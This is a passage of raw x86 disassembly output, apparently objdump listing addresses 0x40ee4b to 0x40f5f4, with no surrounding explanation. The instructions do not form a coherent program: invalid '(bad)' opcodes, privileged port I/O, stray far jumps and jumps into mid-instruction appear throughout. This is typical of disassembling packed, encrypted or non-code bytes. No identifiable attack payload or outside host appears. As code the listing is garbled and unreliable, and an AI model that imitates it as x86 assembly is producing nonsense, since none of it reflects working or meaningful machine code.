  40ee4b:	rol    BYTE PTR [ecx-0x26c96c7b],cl
  40ee51:	adc    DWORD PTR [ebx],ebx
  40ee53:	sub    eax,0x792f73f6
  40ee58:	mov    ah,0x11
  40ee5a:	pushf  
  40ee5b:	or     eax,0x97a95bf3
  40ee60:	xchg   BYTE PTR [ecx+0x3751c082],ch
  40ee66:	xchg   edx,eax
  40ee67:	mov    cs,WORD PTR [edi-0xe050600]
  40ee6d:	adc    DWORD PTR [ebp+ecx*4-0x5b86d658],esp
  40ee74:	das    
  40ee75:	neg    DWORD PTR [ebx+0x2c]
  40ee78:	test   eax,0xbc2bfeaa
  40ee7d:	jbe    0x40eea3
  40ee7f:	sbb    DWORD PTR [eax+ecx*8],0x11c45c2d
  40ee86:	dec    eax
  40ee87:	xchg   ebx,eax
  40ee88:	(bad)  
  40ee89:	pushf  
  40ee8a:	dec    edi
  40ee8b:	and    eax,0x9b844a8b
  40ee90:	je     0x40ef11
  40ee92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee93:	ins    BYTE PTR es:[edi],dx
  40ee94:	fimul  WORD PTR [esp+edi*8-0x73d31669]
  40ee9b:	jp     0x40ee3d
  40ee9d:	or     cl,BYTE PTR [ebp-0x76]
  40eea0:	cmp    BYTE PTR [ebp-0x6c],0xaf
  40eea4:	rol    DWORD PTR [ebx+0x1dd04d5c],0x54
  40eeab:	push   edi
  40eeac:	push   cs
  40eead:	push   ecx
  40eeae:	push   ecx
  40eeaf:	or     eax,0x8a2c5bd3
  40eeb4:	iret   
  40eeb5:	mov    DWORD PTR [esi-0x3e506d02],ebp
  40eebb:	mov    gs,ebp
  40eebd:	into   
  40eebe:	or     DWORD PTR [esi],ebp
  40eec0:	xlat   BYTE PTR ds:[ebx]
  40eec1:	add    bh,BYTE PTR [edi+ebx*2-0x168d342e]
  40eec8:	pop    ss
  40eec9:	in     al,0x4c
  40eecb:	dec    DWORD PTR [edi+ebx*1-0x57]
  40eecf:	mov    BYTE PTR [ebx+0x5aec6cf1],bh
  40eed5:	aas    
  40eed6:	xchg   edi,eax
  40eed7:	ror    BYTE PTR [edx-0x2dd1a197],cl
  40eedd:	fld    TBYTE PTR [ecx+0x64]
  40eee0:	out    0xe5,eax
  40eee2:	out    0x21,eax
  40eee4:	(bad)  
  40eee5:	arpl   WORD PTR [esi+0x7a045d93],bx
  40eeeb:	jae    0x40ef3f
  40eeed:	je     0x40eef6
  40eeef:	out    dx,al
  40eef0:	in     eax,dx
  40eef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef2:	loope  0x40eecf
  40eef4:	ds pop eax
  40eef6:	xchg   ebx,eax
  40eef7:	mov    al,0x1d
  40eef9:	sahf   
  40eefa:	into   
  40eefb:	mov    edi,0x88cc5b8d
  40ef00:	mov    eax,0x5a2f5ad1
  40ef05:	adc    DWORD PTR [esi-0x2cf0cc8],esi
  40ef0b:	int    0x8a
  40ef0d:	push   0xffffff83
  40ef0f:	popa   
  40ef10:	shr    BYTE PTR ds:0x7895eeef,cl
  40ef16:	cs test eax,0x8e36746e
  40ef1c:	and    BYTE PTR [esi],cl
  40ef1e:	inc    ebx
  40ef1f:	push   cs
  40ef20:	clc    
  40ef21:	inc    edx
  40ef22:	pop    edx
  40ef23:	push   esi
  40ef24:	mov    dh,0x61
  40ef26:	test   al,bh
  40ef28:	es dec edi
  40ef2a:	inc    ebp
  40ef2b:	push   edx
  40ef2c:	cbw    
  40ef2e:	fmul   QWORD PTR [esi-0x62eb324]
  40ef34:	mov    DWORD PTR [edi-0x62],esp
  40ef37:	(bad)  
  40ef38:	loopne 0x40eee2
  40ef3a:	ror    BYTE PTR [esi-0x4bb35218],0x27
  40ef41:	(bad)  
  40ef42:	dec    DWORD PTR [esi-0x363db1b4]
  40ef48:	jp     0x40ef58
  40ef4a:	fisub  DWORD PTR [edx+edx*8+0x3bd9ce77]
  40ef51:	dec    ebx
  40ef52:	cmp    al,0x92
  40ef54:	push   0x52215122
  40ef59:	xchg   DWORD PTR [ecx],esp
  40ef5b:	(bad)  
  40ef5c:	aad    0x2f
  40ef5e:	cmp    edx,ecx
  40ef60:	shl    BYTE PTR [ebx+0x7e3af07d],cl
  40ef66:	(bad)  
  40ef67:	push   edi
  40ef68:	in     eax,0x0
  40ef6a:	pusha  
  40ef6b:	test   edx,esp
  40ef6d:	adc    esp,edx
  40ef6f:	jno    0x40ef15
  40ef71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef72:	stc    
  40ef73:	and    ax,0x9039
  40ef77:	pop    eax
  40ef78:	or     esp,DWORD PTR [edi+0x4f9c8eca]
  40ef7e:	push   ebp
  40ef7f:	pop    ebx
  40ef80:	ja     0x40ef4b
  40ef82:	leave  
  40ef83:	jl     0x40ef52
  40ef85:	std    
  40ef86:	xor    BYTE PTR [ebp+0x6508baf0],cl
  40ef8c:	jns    0x40ef3c
  40ef8e:	cld    
  40ef8f:	sub    DWORD PTR [edi+eax*8-0x7b29d2c4],edx
  40ef96:	mov    ?,WORD PTR [edx+0x310f11f3]
  40ef9c:	mov    cl,bh
  40ef9e:	and    eax,0xe0ff77f4
  40efa3:	div    BYTE PTR [esi-0x880a1ef]
  40efa9:	in     eax,0x3f
  40efab:	pop    ebp
  40efac:	ficom  WORD PTR [ecx]
  40efae:	test   eax,0x4a966b0e
  40efb3:	inc    esi
  40efb4:	enter  0x8580,0x81
  40efb8:	shl    BYTE PTR [esi-0x11],1
  40efbb:	dec    esp
  40efbc:	arpl   WORD PTR [ebx],sp
  40efbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efbf:	xchg   edi,eax
  40efc0:	push   edi
  40efc2:	dec    edi
  40efc3:	jmp    0xc107:0x588dee46
  40efca:	test   DWORD PTR [ecx-0x35edcbc6],eax
  40efd0:	add    DWORD PTR [ebx],0x8678976
  40efd6:	imul   edx,DWORD PTR ds:0xd5053c71,0xffffffe3
  40efdd:	pop    es
  40efde:	push   0x52
  40efe0:	test   eax,0x6f7675d5
  40efe5:	or     esp,esi
  40efe7:	mov    eax,0x8ec7ccf8
  40efec:	cmp    al,0x6b
  40efee:	(bad)  
  40eff0:	inc    ebx
  40eff1:	cmc    
  40eff2:	adc    dl,BYTE PTR [ebx]
  40eff4:	sar    DWORD PTR [eax-0x61a9a206],1
  40effa:	adc    esi,ecx
  40effc:	into   
  40effd:	inc    esi
  40effe:	xor    ah,ch
  40f000:	xchg   edx,eax
  40f001:	adc    DWORD PTR [edx+ecx*2-0x75d29b92],ebx
  40f008:	out    dx,al
  40f009:	and    al,BYTE PTR [ebp-0x1073e49b]
  40f00f:	xchg   ebx,eax
  40f010:	inc    ebx
  40f011:	or     DWORD PTR [ebp-0x72],0xf346f83f
  40f018:	call   0xae94:0xa9173ec3
  40f01f:	xor    esp,DWORD PTR [eax]
  40f021:	push   0x620e8fd4
  40f026:	ror    DWORD PTR [edx+eax*1+0x63ff79de],cl
  40f02d:	enter  0xdc65,0x2f
  40f031:	add    ebp,esi
  40f033:	mov    edi,0x7ec45b07
  40f038:	jp     0x40f013
  40f03a:	aaa    
  40f03b:	push   cs
  40f03c:	add    DWORD PTR [eax],ebp
  40f03e:	stos   DWORD PTR es:[edi],eax
  40f03f:	fbld   TBYTE PTR [esi-0x4e83fae2]
  40f045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f046:	xchg   edx,eax
  40f047:	clc    
  40f048:	aad    0x52
  40f04a:	cwde   
  40f04b:	fs jmp 0x3af8:0x11140091
  40f053:	xchg   edx,eax
  40f054:	je     0x40f0c1
  40f056:	sbb    eax,0x1ae8823e
  40f05b:	jecxz  0x40f04b
  40f05d:	popa   
  40f05e:	pop    eax
  40f05f:	pop    eax
  40f060:	lods   eax,DWORD PTR ds:[esi]
  40f061:	jle    0x40f0d1
  40f063:	push   ds
  40f064:	gs lock jns 0x40f09e
  40f068:	test   DWORD PTR [edx],0xbd9bafe4
  40f06e:	add    eax,0x407051b2
  40f073:	out    dx,al
  40f074:	push   cs
  40f075:	jmp    0x9e1a:0x11dc3889
  40f07c:	mov    esi,0x1d643a2d
  40f081:	adc    edi,esp
  40f083:	call   0x9f5d:0x53b5d2bd
  40f08a:	test   DWORD PTR [edi],ecx
  40f08c:	ins    DWORD PTR es:[edi],dx
  40f08d:	sbb    dh,BYTE PTR [eax+0x5abca881]
  40f093:	mov    ss,WORD PTR [ecx-0xe]
  40f096:	and    ebp,DWORD PTR [bp+di-0x64e4]
  40f09b:	adc    al,0xa6
  40f09d:	int    0x8a
  40f09f:	cmp    eax,esi
  40f0a1:	jl     0x40f053
  40f0a3:	cmc    
  40f0a4:	xor    al,0x49
  40f0a6:	dec    ebp
  40f0a7:	push   0xffffffe2
  40f0a9:	dec    ecx
  40f0aa:	inc    edx
  40f0ab:	mov    ss,ebp
  40f0ad:	inc    eax
  40f0ae:	xchg   ebp,eax
  40f0af:	aaa    
  40f0b0:	push   esp
  40f0b1:	rol    BYTE PTR [edi-0x69],0xd2
  40f0b5:	test   ch,al
  40f0b7:	lock outs dx,BYTE PTR ds:[esi]
  40f0b9:	rol    DWORD PTR [eax-0x51],cl
  40f0bc:	jns    0x40f0dd
  40f0be:	ret    0xf92
  40f0c1:	mov    ecx,DWORD PTR [eax+0x2309a49e]
  40f0c7:	pusha  
  40f0c8:	test   eax,0xc5c5dd49
  40f0cd:	mov    ebp,0xd18a4325
  40f0d2:	ins    BYTE PTR es:[edi],dx
  40f0d3:	data16 lods al,BYTE PTR ds:[esi]
  40f0d5:	(bad)
  40f0d8:	shl    bh,cl
  40f0da:	enter  0x78d1,0x20
  40f0de:	(bad)  
  40f0e0:	into   
  40f0e1:	xchg   bh,ah
  40f0e3:	(bad)  
  40f0e4:	rcl    BYTE PTR [ebp+eax*2+0xe807bfa],cl
  40f0eb:	lahf   
  40f0ec:	pop    ss
  40f0ed:	cs inc ebx
  40f0ef:	in     eax,dx
  40f0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f1:	adc    DWORD PTR [eax],ebx
  40f0f3:	mov    WORD PTR [ebx],cs
  40f0f5:	pop    ecx
  40f0f6:	das    
  40f0f7:	call   0x5436cce
  40f0fc:	cs retf 
  40f0fe:	adc    BYTE PTR [edi-0x7e49eef6],ah
  40f104:	add    al,0xf8
  40f106:	cld    
  40f107:	pcmpeqw mm6,QWORD PTR [ebp+0x269bde84]
  40f10e:	mov    edx,0xa9b00250
  40f113:	sbb    eax,0x4965113d
  40f118:	(bad)  
  40f119:	adc    ebp,DWORD PTR [esi-0x7fd10819]
  40f11f:	push   ds
  40f120:	test   al,0x2d
  40f122:	xchg   esi,eax
  40f123:	mov    es,WORD PTR [ecx+0x78]
  40f126:	push   0x29
  40f128:	cmp    eax,0xb712eb11
  40f12d:	jo     0x40f16b
  40f12f:	dec    edi
  40f130:	(bad)  
  40f131:	pop    esp
  40f132:	call   0x406692ed
  40f137:	aad    0x79
  40f139:	sahf   
  40f13a:	loop   0x40f0cb
  40f13c:	pop    edx
  40f13d:	mov    BYTE PTR [esi],bh
  40f13f:	lea    edx,[ebx-0x42]
  40f142:	(bad)  
  40f143:	into   
  40f144:	pushf  
  40f145:	out    0x71,al
  40f147:	and    al,0xd2
  40f149:	jmp    0x2cc4:0xaffaccb
  40f150:	and    al,0x10
  40f152:	cmp    esp,DWORD PTR gs:[edi]
  40f155:	popa   
  40f156:	or     DWORD PTR [edx+ecx*2-0x2d446b38],ecx
  40f15d:	add    BYTE PTR [edx-0x11],0x9f
  40f161:	jge    0x40f176
  40f163:	dec    edx
  40f164:	sbb    DWORD PTR [ecx],edx
  40f166:	mov    ch,0xb1
  40f168:	out    0xab,eax
  40f16a:	rol    BYTE PTR [ebx+esi*8],cl
  40f16d:	mov    ebp,0xa595ab81
  40f172:	jle    0x40f14d
  40f174:	sub    DWORD PTR [edi+eiz*4+0x12],eax
  40f178:	inc    ebx
  40f179:	shl    DWORD PTR [ebx-0x18df919c],1
  40f17f:	mov    es,edx
  40f181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f182:	lea    esi,[eax-0x720a915]
  40f188:	ror    BYTE PTR [esi-0x4a],cl
  40f18b:	dec    esp
  40f18c:	ins    DWORD PTR es:[edi],dx
  40f18d:	inc    edi
  40f18e:	enter  0x18cc,0x1e
  40f192:	cmp    edi,ebp
  40f194:	cmc    
  40f195:	rcr    BYTE PTR [eax-0x1c8afd7b],cl
  40f19b:	xlat   BYTE PTR ds:[ebx]
  40f19c:	rol    BYTE PTR [ecx-0x21],cl
  40f19f:	or     ebp,0x7f
  40f1a2:	jo     0x40f191
  40f1a4:	sub    al,BYTE PTR ds:0x51bdf7da
  40f1aa:	loopne 0x40f1fa
  40f1ac:	icebp  
  40f1ad:	sub    al,0x13
  40f1af:	fisubr DWORD PTR [ecx-0x2374b121]
  40f1b5:	ins    DWORD PTR es:[edi],dx
  40f1b6:	(bad)  
  40f1b7:	or     dl,dl
  40f1b9:	gs out dx,al
  40f1bb:	scas   al,BYTE PTR es:[edi]
  40f1bc:	call   0xbe5a:0x569ec411
  40f1c3:	pop    edi
  40f1c4:	adc    ah,ah
  40f1c6:	xchg   bl,al
  40f1c8:	ja     0x40f21b
  40f1ca:	outs   dx,BYTE PTR ds:[esi]
  40f1cb:	out    dx,eax
  40f1cc:	rol    DWORD PTR [eax-0x4d],cl
  40f1cf:	lds    esi,FWORD PTR [edi]
  40f1d1:	sbb    eax,0x112628a5
  40f1d6:	push   DWORD PTR [eax+edi*8-0x284abd1d]
  40f1dd:	mov    ebp,0x7b050f85
  40f1e2:	imul   edx,DWORD PTR [ecx],0x54
  40f1e5:	or     bl,BYTE PTR [ebx-0x61]
  40f1e8:	sbb    esi,edx
  40f1ea:	cs aaa 
  40f1ec:	mov    dl,0x4b
  40f1ee:	jb     0x40f1cd
  40f1f0:	stos   BYTE PTR es:[edi],al
  40f1f1:	fmul   DWORD PTR [eax+0x91ef5fd]
  40f1f7:	lods   al,BYTE PTR ds:[esi]
  40f1f8:	sbb    dh,BYTE PTR [esi-0x3948090f]
  40f1fe:	aad    0x9
  40f200:	xchg   esi,eax
  40f201:	adc    DWORD PTR [edx+ebx*1],eax
  40f204:	aaa    
  40f205:	icebp  
  40f206:	popf   
  40f207:	je     0x40f1f4
  40f209:	rol    DWORD PTR [ebp-0x6ead3370],0x68
  40f210:	clc    
  40f211:	dec    edx
  40f212:	clc    
  40f213:	mov    BYTE PTR [esi+0x6a8e0a2b],cl
  40f219:	xor    DWORD PTR [eax+edi*4-0x2008837c],ebx
  40f220:	xchg   esp,eax
  40f221:	loope  0x40f1a8
  40f223:	popa   
  40f224:	aaa    
  40f225:	inc    edx
  40f226:	loope  0x40f246
  40f228:	or     bl,BYTE PTR [eax+edx*1]
  40f22b:	sub    esp,edx
  40f22d:	fwait
  40f22e:	outs   dx,BYTE PTR ds:[esi]
  40f22f:	mov    esi,0x9535aa0e
  40f234:	or     ah,BYTE PTR [edi+esi*1]
  40f237:	lea    ebx,[esi-0x70a7d592]
  40f23d:	call   0x120c:0x11a566d0
  40f244:	sbb    cl,bl
  40f246:	push   edx
  40f247:	pop    ebx
  40f248:	lods   eax,DWORD PTR ds:[esi]
  40f249:	rol    BYTE PTR [ebp+0x168548aa],cl
  40f24f:	dec    edi
  40f250:	pop    ecx
  40f251:	(bad)  
  40f252:	jmp    0x40f1e2
  40f254:	xor    BYTE PTR [edi-0x5e3b607d],dh
  40f25a:	jmp    0x297508ec
  40f25f:	mov    ebp,esi
  40f261:	cmp    DWORD PTR [edi+0x7a092dac],ebp
  40f267:	ret    0x79a5
  40f26a:	loopne 0x40f246
  40f26c:	loop   0x40f27f
  40f26e:	(bad)  
  40f26f:	cs push ebp
  40f271:	jecxz  0x40f269
  40f273:	or     eax,0x748b41d8
  40f278:	out    dx,eax
  40f279:	(bad)  
  40f27a:	cdq    
  40f27b:	int    0x35
  40f27d:	or     DWORD PTR [ebx+0x67113073],edi
  40f283:	push   ds
  40f284:	jbe    0x40f21b
  40f286:	rcr    BYTE PTR [ecx+0x20852022],1
  40f28c:	push   ss
  40f28d:	xor    BYTE PTR [ebp+edx*1-0x4e],al
  40f291:	lds    edi,FWORD PTR [ecx*4-0x6c47ae95]
  40f298:	fistp  WORD PTR [ebp+0x1]
  40f29b:	js     0x40f26f
  40f29d:	jbe    0x40f270
  40f29f:	mov    esi,0xcdcf96c2
  40f2a4:	mov    edi,0xc989a9f9
  40f2a9:	mov    al,ds:0x94490e17
  40f2ae:	add    ah,bl
  40f2b0:	dec    edi
  40f2b1:	ja     0x40f238
  40f2b3:	push   ds
  40f2b4:	mov    edx,0xa16a7491
  40f2b9:	cmp    dh,BYTE PTR [ebx-0x7ea092e8]
  40f2bf:	xlat   BYTE PTR ds:[ebx]
  40f2c0:	rol    DWORD PTR [ebx-0x1c],1
  40f2c3:	fucomi st,st(6)
  40f2c5:	adc    al,0xa2
  40f2c7:	mov    edi,0xcd85e6ef
  40f2cc:	jbe    0x40f324
  40f2ce:	das    
  40f2cf:	stos   BYTE PTR es:[edi],al
  40f2d0:	test   eax,0x512b3842
  40f2d5:	loope  0x40f30c
  40f2d7:	retf   
  40f2d8:	jmp    0x1ace311a
  40f2dd:	dec    esp
  40f2de:	cmp    cl,BYTE PTR [edx-0x1d]
  40f2e1:	push   ss
  40f2e2:	scas   eax,DWORD PTR es:[edi]
  40f2e3:	push   ecx
  40f2e4:	shr    dh,cl
  40f2e6:	or     bl,BYTE PTR [esi]
  40f2e8:	pop    ebx
  40f2e9:	ins    BYTE PTR es:[edi],dx
  40f2ea:	stc    
  40f2eb:	les    esp,FWORD PTR [edx]
  40f2ed:	in     eax,dx
  40f2ee:	enter  0xee93,0x5e
  40f2f2:	push   esp
  40f2f3:	and    eax,0x7ab5cbb9
  40f2f8:	xchg   ecx,eax
  40f2f9:	xchg   edi,eax
  40f2fa:	mov    dh,BYTE PTR [ebp+0x2]
  40f2fd:	push   edi
  40f2fe:	jmp    0x40f34e
  40f300:	in     al,dx
  40f301:	dec    ebx
  40f302:	imul   ebp,DWORD PTR [esi],0xffffff99
  40f305:	dec    esi
  40f306:	sbb    eax,0x6f264e65
  40f30b:	(bad)  
  40f30c:	rcr    DWORD PTR [eax-0x68],cl
  40f30f:	cwde   
  40f310:	outs   dx,DWORD PTR ds:[esi]
  40f311:	pop    esp
  40f312:	xchg   edi,eax
  40f313:	out    0xc6,al
  40f315:	adc    al,BYTE PTR [ebp+0x494ed82c]
  40f31b:	lods   eax,DWORD PTR ds:[esi]
  40f31c:	xchg   ebp,eax
  40f31d:	loopne 0x40f2ee
  40f31f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f320:	dec    esi
  40f321:	test   eax,0xaa148f05
  40f326:	inc    ecx
  40f327:	jmp    0xafdf:0x848440b4
  40f32e:	sbb    DWORD PTR [ebx-0x6d],0x71
  40f332:	push   eax
  40f333:	mov    gs,WORD PTR [ecx-0x42]
  40f336:	jno    0x40f35b
  40f338:	xor    eax,0xa97088e6
  40f33d:	not    DWORD PTR [ebx]
  40f33f:	mov    ch,0xf8
  40f341:	mov    bl,0xd5
  40f343:	in     al,dx
  40f344:	in     al,0xeb
  40f346:	mov    bl,0x9b
  40f348:	imul   ecx,DWORD PTR [edx],0xffffffb7
  40f34b:	mov    ecx,0x743eb152
  40f350:	call   0x3cc2:0xd5d88463
  40f357:	push   0x4a12bb56
  40f35c:	xchg   ecx,eax
  40f35d:	sbb    eax,0x491f0685
  40f362:	dec    ebp
  40f363:	out    dx,al
  40f364:	jbe    0x40f2e6
  40f366:	test   DWORD PTR [ebp+esi*8+0x5c],ecx
  40f36a:	mov    bl,BYTE PTR [ecx-0x7136ff7b]
  40f370:	call   FWORD PTR [edx+0x5201df5a]
  40f376:	pushf  
  40f377:	retf   0x18d4
  40f37a:	sub    edx,DWORD PTR [esi+0x7c]
  40f37d:	call   DWORD PTR [bx+si+0x715e]
  40f382:	cmovo  ebp,DWORD PTR [edi-0x4a]
  40f386:	or     ebx,ecx
  40f388:	nop
  40f389:	in     al,0x9e
  40f38b:	test   al,0x94
  40f38d:	sbb    ah,ch
  40f38f:	out    0x33,eax
  40f391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f392:	ins    BYTE PTR es:[edi],dx
  40f393:	shl    BYTE PTR [edx-0x65],1
  40f396:	retf   
  40f397:	push   0x42b5183
  40f39c:	clc    
  40f39d:	mov    DWORD PTR [ebp-0x37b00d2e],0x6a7fc554
  40f3a7:	mov    ?,WORD PTR [ecx-0x6]
  40f3aa:	sahf   
  40f3ab:	retf   
  40f3ac:	and    esp,eax
  40f3ae:	mov    DWORD PTR [esi-0x2d],esi
  40f3b1:	or     al,0xa0
  40f3b3:	sbb    eax,0xb53141f3
  40f3b8:	mov    dl,0x6b
  40f3ba:	xor    ecx,DWORD PTR [ebp+0x1386552c]
  40f3c0:	ror    DWORD PTR [ebp+0x3c],cl
  40f3c3:	jp     0x40f38c
  40f3c5:	arpl   sp,si
  40f3c7:	mov    dl,dl
  40f3c9:	or     BYTE PTR [edi+esi*4-0x593de332],0x4a
  40f3d1:	or     al,0x85
  40f3d3:	mov    esp,0x9b35b5d0
  40f3d8:	hlt    
  40f3d9:	jne    0x40f3ae
  40f3db:	push   ecx
  40f3dc:	fdivr  DWORD PTR [eax-0x58]
  40f3df:	(bad)  
  40f3e0:	rcl    DWORD PTR [edx],cl
  40f3e2:	sbb    eax,0x59b1771f
  40f3e7:	and    eax,0xb8d20d4f
  40f3ec:	fs push ds
  40f3ee:	or     al,BYTE PTR [eax]
  40f3f0:	adc    al,0x5c
  40f3f2:	sub    eax,0xd132e6a2
  40f3f7:	push   cs
  40f3f8:	pop    ebx
  40f3f9:	mov    esi,0xc8902194
  40f3fe:	fmul   DWORD PTR [esi+0x65342886]
  40f404:	mov    cl,0x4f
  40f406:	scas   al,BYTE PTR es:[edi]
  40f407:	mov    edx,ss
  40f409:	fisub  DWORD PTR [ecx+0x55]
  40f40c:	pop    ebx
  40f40d:	pop    ebp
  40f40e:	sbb    bh,BYTE PTR [ebx]
  40f410:	jbe    0x40f430
  40f412:	jmp    0xf5ca195
  40f417:	imul   esp,DWORD PTR [edx],0x12
  40f41a:	mov    bl,BYTE PTR [ecx+ecx*2-0xa040a8c]
  40f421:	pop    ebx
  40f422:	push   esp
  40f423:	mov    ch,0x35
  40f425:	adc    DWORD PTR [ecx-0x2e],edx
  40f428:	adc    DWORD PTR [esi+edx*2],edi
  40f42b:	cmp    bl,BYTE PTR [edi]
  40f42d:	adc    al,0xf8
  40f42f:	ret    
  40f430:	add    DWORD PTR [eax*4+0x6362107f],esi
  40f437:	dec    ecx
  40f438:	xchg   ebp,eax
  40f439:	outs   dx,DWORD PTR ds:[esi]
  40f43a:	stc    
  40f43b:	xchg   ebx,eax
  40f43c:	jno    0x40f461
  40f43e:	add    BYTE PTR [eax-0x2a],0x35
  40f442:	mov    ebp,0x85d1d077
  40f447:	mov    esi,0x4b8bf2ec
  40f44c:	cmp    al,0x12
  40f44e:	pop    es
  40f44f:	mov    ss,WORD PTR [edi-0xc]
  40f452:	into   
  40f453:	dec    edi
  40f454:	jbe    0x40f493
  40f456:	mov    esi,0x8760eacf
  40f45b:	mov    al,dh
  40f45d:	ret    
  40f45e:	add    eax,0xd083c741
  40f463:	jno    0x40f407
  40f465:	adc    DWORD PTR [edi-0x57],ebp
  40f468:	loop   0x40f49f
  40f46a:	xchg   edi,eax
  40f46b:	push   eax
  40f46c:	jo     0x40f473
  40f46e:	dec    esi
  40f46f:	(bad)  
  40f470:	popa   
  40f471:	inc    ecx
  40f472:	cwde   
  40f473:	push   ss
  40f474:	jne    0x40f428
  40f476:	test   ebp,eax
  40f478:	xor    DWORD PTR [eax-0xb],esp
  40f47b:	sbb    ah,BYTE PTR [ebp+0x1e]
  40f47e:	outs   dx,BYTE PTR ds:[esi]
  40f47f:	fild   DWORD PTR [eax+edx*4-0x5c]
  40f483:	daa    
  40f484:	arpl   cx,si
  40f486:	lea    ebx,[esi]
  40f488:	adc    dl,BYTE PTR [ecx+0x36175ecf]
  40f48e:	imul   ebp,DWORD PTR ds:0xb1c311a4,0x9a010de8
  40f498:	fucomp st(2)
  40f49a:	test   DWORD PTR [ebx],esi
  40f49c:	ret    0x4394
  40f49f:	xchg   ecx,eax
  40f4a0:	mov    ecx,0x88bb8e
  40f4a5:	stos   BYTE PTR es:[edi],al
  40f4a6:	push   edx
  40f4a7:	push   cs
  40f4a8:	inc    ecx
  40f4a9:	fsub   QWORD PTR [ecx+0x4]
  40f4ac:	out    0x90,eax
  40f4ae:	test   ebp,ecx
  40f4b0:	pop    edx
  40f4b1:	int3   
  40f4b2:	jle    0x40f44a
  40f4b4:	cld    
  40f4b5:	and    BYTE PTR [edx-0x72],bl
  40f4b8:	loope  0x40f4e4
  40f4ba:	jns    0x40f51f
  40f4bc:	push   ebx
  40f4bd:	sbb    edi,DWORD PTR [ecx]
  40f4bf:	sub    esi,eax
  40f4c1:	xchg   esp,eax
  40f4c2:	dec    BYTE PTR [edx-0x3cb6256e]
  40f4c8:	(bad)  
  40f4c9:	cmp    ebp,DWORD PTR [ebx-0x3848e472]
  40f4cf:	mov    ecx,0xd23a5067
  40f4d4:	rcr    BYTE PTR [edx-0x38852577],cl
  40f4da:	mov    esp,0x91eae23
  40f4df:	and    al,dh
  40f4e1:	call   0x6e7afc3a
  40f4e6:	(bad)  
  40f4e7:	ficom  DWORD PTR [esi-0xcca7bb3]
  40f4ed:	mov    bh,bl
  40f4ef:	in     eax,0xac
  40f4f1:	sbb    bh,ch
  40f4f3:	imul   ecx,esi,0x140ede11
  40f4f9:	push   es
  40f4fa:	lods   al,BYTE PTR ds:[esi]
  40f4fb:	rol    DWORD PTR [eax-0x4beb7adf],0x14
  40f502:	and    al,0x34
  40f504:	adc    edx,DWORD PTR [ebx]
  40f506:	das    
  40f507:	lea    ebp,[edx+0x3920e5a4]
  40f50d:	inc    ecx
  40f50e:	add    edi,DWORD PTR [ecx-0x213ea02e]
  40f514:	into   
  40f515:	jmp    0x40f531
  40f517:	dec    ecx
  40f518:	ret    
  40f519:	jae    0x40f583
  40f51b:	mov    fs,WORD PTR [eax+eiz*4+0x44]
  40f51f:	add    eax,DWORD PTR [ecx-0x2c40fd82]
  40f525:	pop    edi
  40f526:	outs   dx,DWORD PTR ds:[esi]
  40f527:	popf   
  40f528:	adc    BYTE PTR [edx+0x5],al
  40f52b:	jl     0x40f4bf
  40f52d:	push   ebx
  40f52e:	push   eax
  40f52f:	push   0x914611ef
  40f534:	mov    ds:0xe4e137f,al
  40f539:	inc    ebx
  40f53a:	test   BYTE PTR [edx],bl
  40f53c:	jnp    0x40f574
  40f53e:	aam    0xea
  40f540:	adc    BYTE PTR [eax-0x726571f6],ch
  40f546:	push   ebx
  40f547:	inc    ecx
  40f548:	pop    ecx
  40f549:	or     dh,ch
  40f54b:	mov    ecx,0xf060cbd2
  40f550:	xor    esi,DWORD PTR [edx+ecx*2]
  40f553:	push   ebx
  40f554:	and    BYTE PTR [ecx],dl
  40f556:	xor    al,0xe8
  40f558:	push   ebx
  40f559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f55a:	dec    esp
  40f55b:	cmp    edx,ecx
  40f55d:	dec    esp
  40f55e:	test   BYTE PTR [eax-0x5e267db5],bl
  40f564:	cmp    BYTE PTR [esp+esi*2-0x72],0x39
  40f569:	mov    bl,0xcb
  40f56b:	mov    ch,bh
  40f56d:	jmp    0x40f59c
  40f56f:	outs   dx,DWORD PTR ds:[esi]
  40f570:	rcl    ch,1
  40f572:	or     eax,0xadb074ac
  40f577:	imul   DWORD PTR [esi]
  40f579:	jle    0x40f571
  40f57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f57c:	jmp    0x1303a992
  40f581:	fstp   TBYTE PTR [ebx+eiz*8]
  40f584:	out    0x1a,eax
  40f586:	mov    ebp,cs
  40f588:	xchg   ebp,eax
  40f589:	adc    DWORD PTR [esi+0x9],esp
  40f58c:	mov    ecx,0xd052a108
  40f591:	pop    es
  40f592:	mov    ah,0xa4
  40f594:	mov    eax,ds:0x387332d1
  40f599:	xchg   ecx,eax
  40f59a:	cmp    esp,0xffffffa9
  40f59d:	pop    ebx
  40f59e:	mov    al,0xb3
  40f5a0:	xor    DWORD PTR [ebp-0x166dd8af],ecx
  40f5a6:	aaa    
  40f5a7:	nop
  40f5a8:	xor    al,BYTE PTR [ecx+0x523a8e04]
  40f5ae:	aas    
  40f5af:	out    0xee,al
  40f5b1:	stc    
  40f5b2:	mov    WORD PTR [ebp-0x2e],ss
  40f5b5:	pop    edx
  40f5b6:	outs   dx,BYTE PTR ds:[esi]
  40f5b7:	and    dh,BYTE PTR [esi+0x16]
  40f5ba:	jae    0x40f606
  40f5bc:	jnp    0x40f5dc
  40f5be:	call   0x2fea:0x8274cf89
  40f5c5:	in     al,dx
  40f5c6:	push   ebx
  40f5c7:	mov    dh,0xd2
  40f5c9:	sbb    DWORD PTR [esi+0x25f610a2],0x39
  40f5d0:	inc    edi
  40f5d1:	push   ecx
  40f5d2:	call   0xb39270f7
  40f5d7:	mov    esp,0xab2341a2
  40f5dc:	sar    BYTE PTR [esi],cl
  40f5de:	icebp  
  40f5df:	cwde   
  40f5e0:	retf   0xb34e
  40f5e3:	inc    eax
  40f5e4:	aad    0x11
  40f5e6:	bndstx [ecx-0x3a],(bad)
  40f5ea:	in     al,dx
  40f5eb:	fistp  QWORD PTR ds:0x5aba85aa
  40f5f1:	jecxz  0x40f644
  40f5f3:	scas   eax,DWORD PTR es:[edi]
  40f5f4:	lahf   
